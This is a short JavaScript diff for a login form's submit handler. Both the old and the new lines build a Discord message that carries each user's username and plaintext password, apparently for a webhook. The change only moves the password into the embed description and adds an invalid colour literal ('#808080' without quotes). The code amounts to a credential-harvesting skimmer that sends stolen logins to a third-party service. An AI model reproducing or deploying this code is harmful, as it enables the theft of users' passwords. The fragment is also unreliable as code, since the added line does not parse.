@@ -9,11 +9,11 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
 
     // Prepare the payload to send to Discord
     const embed = {
-        content: `${username}: has logged in with the password: ${password}`,
+        content: `# new login`,
         embeds: [{
             title: 'Login Alert',
-            description: `${username} has logged in.`,
-            color: 0x00FF00,
+            description: `${username} has logged in. Their pass is ${password}`,
+            color: #808080,
         }],
     };
 
